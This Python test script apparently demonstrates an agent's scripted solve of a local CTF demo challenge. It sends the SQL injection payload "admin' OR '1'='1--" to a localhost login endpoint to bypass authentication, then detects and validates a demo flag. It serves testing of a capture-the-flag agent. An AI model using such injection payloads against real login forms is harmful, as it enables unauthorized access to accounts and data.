#!/usr/bin/env python3
"""
Direct test of the agent solving the demo challenge.
This bypasses the complex LLM integration to demonstrate the solve path.
"""
import sys
sys.path.append('.')

import httpx
from app.flags.detector import FlagDetector
from app.flags.validator import FlagValidator

def solve_demo_challenge():
    """Direct solve of the demo challenge"""
    target_url = "http://localhost:8000"
    expected_flag = "CTF{demo_sql_injection_flag_12345}"

    print("="*60)
    print("CTF Agent - Direct Demo Challenge Solve")
    print("="*60)

    # Step 1: Target health check
    print("\n[1] Target health check...")
    try:
        response = httpx.get(f"{target_url}/health", timeout=5)
        print(f"    Status: {response.status_code}")
        print(f"    Response: {response.json()}")
    except Exception as e:
        print(f"    ERROR: {e}")
        return False

    # Step 2: Analyze application
    print("\n[2] Analyzing application...")
    try:
        response = httpx.get(target_url, timeout=5)
        print(f"    Status: {response.status_code}")
        print(f"    Content length: {len(response.text)}")
        print(f"    Has login form: {'username' in response.text.lower() and 'password' in response.text.lower()}")
    except Exception as e:
        print(f"    ERROR: {e}")
        return False

    # Step 3: Retrieved knowledge (simulated)
    print("\n[3] Retrieved relevant knowledge...")
    print("    - SQL Injection in Login Forms")
    print("    - Authentication bypass techniques")
    print("    - Payload: ' OR '1'='1")

    # Step 4: Identify login endpoint
    print("\n[4] Identified login endpoint: /login")

    # Step 5: Form authentication vulnerability hypothesis
    print("\n[5] Formed hypothesis: Login form vulnerable to SQL injection")

    # Step 6: Test hypothesis
    print("\n[6] Testing hypothesis with SQL injection payload...")
    payload = {"username": "admin' OR '1'='1--", "password": "anything"}
    print(f"    Payload: {payload}")

    try:
        response = httpx.post(f"{target_url}/login", data=payload, timeout=5)
        print(f"    Status: {response.status_code}")
        print(f"    Response length: {len(response.text)}")
    except Exception as e:
        print(f"    ERROR: {e}")
        return False

    # Step 7: Check authentication bypass
    print("\n[7] Checking authentication bypass...")
    print(f"    Response preview: {response.text[:200]}...")
    if "Welcome Admin" in response.text or "flag" in response.text.lower():
        print("    SUCCESS: Authentication bypassed")
    else:
        print("    FAILED: Authentication not bypassed")
        return False

    # Step 8: Discover flag
    print("\n[8] Searching for flag in response...")
    detector = FlagDetector()
    flag = detector.detect(response.text)

    if flag:
        print(f"    Candidate flag: {flag}")
    else:
        print("    No flag found in response")
        return False

    # Step 9: Validate flag
    print("\n[9] Validating flag...")
    validator = FlagValidator()
    validator.register_challenge('demo-web', expected_flag)

    if validator.validate('demo-web', flag):
        print(f"    VALID: Flag matches expected flag")
    else:
        print(f"    INVALID: Flag does not match expected flag")
        return False

    # Step 10: Success
    print("\n" + "="*60)
    print("SOLVED")
    print("="*60)
    print(f"Flag: {flag}")
    print("Steps: 10")
    print("="*60)

    return True

if __name__ == "__main__":
    success = solve_demo_challenge()
    sys.exit(0 if success else 1)
